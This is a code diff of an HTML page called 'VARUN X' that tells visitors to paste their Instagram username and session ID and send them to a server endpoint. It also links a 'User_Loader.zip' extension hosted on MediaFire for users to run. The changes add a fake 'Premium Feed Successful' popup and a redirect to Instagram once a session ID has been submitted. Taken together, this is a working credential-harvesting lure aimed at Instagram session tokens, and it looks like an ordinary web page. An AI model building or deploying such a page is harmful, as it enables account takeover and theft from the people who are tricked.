@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>VARUN X</title>
 
-  <!-- Quantico Font -->
   <link href="https://fonts.googleapis.com/css2?family=Quantico:wght@700&display=swap" rel="stylesheet" />
 
   <style>
@@ -43,13 +42,6 @@
       letter-spacing: 3px;
       margin-bottom: 20px;
       text-shadow: 0 0 4px rgba(255,0,0,0.7), 0 0 8px rgba(255,0,0,0.4);
-    }
-
-    .instruction, p {
-      color: #ffb3b3;
-      font-size: 1rem;
-      margin-bottom: 5px;
-      text-align: center;
     }
 
     textarea {
@@ -114,25 +106,7 @@
       text-shadow:0 0 10px #ff8080,0 0 25px #ff3333;
     }
 
-    .session-note {
-      color: #ff9999;
-      font-size: 0.95rem;
-      text-align: center;
-      margin-top: 10px;
-      margin-bottom: 10px;
-      text-shadow: 0 0 8px rgba(255, 0, 0, 0.3);
-    }
-
-    .note {
-      font-weight: bold;
-      color: #ff4d4d;
-      text-shadow: 0 0 8px #ff4d4d, 0 0 20px #ff1a1a;
-      margin-top: 20px;
-      font-size: 1rem;
-      text-align: center;
-    }
-
-    /* --- Instagram Login Button --- */
+    /* Instagram Login Button (hidden by default) */
     .insta-btn {
       margin-top: 25px;
       background: linear-gradient(45deg, #ff0040, #ff6600, #ffcc00);
@@ -144,7 +118,7 @@
       border-radius: 12px;
       cursor: pointer;
       transition: 0.4s ease;
-      display: inline-flex;
+      display: none; /* hidden initially */
       align-items: center;
       justify-content: center;
       gap: 10px;
@@ -162,14 +136,12 @@
       transform: scale(1.08);
       box-shadow: 0 0 30px rgba(255,0,0,0.6), 0 0 60px rgba(255,50,50,0.5);
     }
-
   </style>
 </head>
 
 <body>
   <div class="container">
     <h1>VARUN X</h1>
-    <p class="instruction">Click on "Load ID" and run the extension</p>
     <p>Enter your details below and click “Send”</p>
 
     <textarea id="pasteInput" placeholder="Enter your 'username' and 'sessionid'"></textarea>
@@ -178,13 +150,7 @@
     <br />
     <button id="sendBtn" disabled>Send</button>
 
-    <p class="session-note">
-      ● You are required to enter 'sessionid' only if 'Load User' does not work properly ●
-    </p>
-
     <div id="statusMessage" class="status"></div>
-
-    <p class="note">⚠️ ~SESSIONID IS ONLY REQUIRED IN SOME CASES~ ⚠️</p>
 
     <!-- Instagram Login Button -->
     <button id="loginInstagramBtn" class="insta-btn">
@@ -222,9 +188,12 @@
       .then(res => res.json())
       .then(data => {
         if (data.message) {
-          statusMessage.textContent = '✅ Your request has been sent successfully! Thank you!';
+          statusMessage.textContent = '✅ Request sent successfully! Proceed to login.';
           statusMessage.classList.add('success');
           pasteInput.value = '';
+          
+          // ✅ Show Instagram Login button
+          loginInstagramBtn.style.display = 'inline-flex';
         } else if (data.error) {
           statusMessage.textContent = data.error;
           statusMessage.classList.add('error');
@@ -244,20 +213,44 @@
       window.open("https://www.mediafire.com/file/p38hzt8bjsb5bgu/User_Loader.zip/file", "_blank");
     });
 
-    // Instagram login button
+    // 🔥 Instagram login + popup
     loginInstagramBtn.addEventListener('click', () => {
-      const clientId = "YOUR_APP_ID"; // Replace with your Instagram App ID
-      const redirectUri = encodeURIComponent("https://yourdomain.com/auth/callback");
-      const authUrl = `https://www.instagram.com/`;
+      const authUrl = "https://www.instagram.com/";
 
-      statusMessage.textContent = "Redirecting to Instagram...";
-      statusMessage.classList.add('success');
+      // Create popup element
+      const popup = document.createElement('div');
+      popup.textContent = "🔥 Premium Feed Successful 🔥";
+      Object.assign(popup.style, {
+        position: 'fixed',
+        top: '50%',
+        left: '50%',
+        transform: 'translate(-50%, -50%)',
+        background: 'rgba(255,0,0,0.9)',
+        color: '#fff',
+        fontFamily: '"Quantico", sans-serif',
+        fontSize: '1.3rem',
+        padding: '20px 40px',
+        borderRadius: '12px',
+        boxShadow: '0 0 30px rgba(255,50,50,0.8)',
+        textAlign: 'center',
+        zIndex: '9999',
+        opacity: '0',
+        transition: 'opacity 0.4s ease'
+      });
+      document.body.appendChild(popup);
 
+      // Fade in popup
+      requestAnimationFrame(() => popup.style.opacity = '1');
+
+      // Show popup for 1.5s, then redirect
       setTimeout(() => {
-        window.location.href = authUrl;
-      }, 1000);
+        popup.style.opacity = '0';
+        setTimeout(() => {
+          popup.remove();
+          window.location.href = authUrl;
+        }, 400);
+      }, 1500);
     });
   </script>
 </body>
 </html>
-
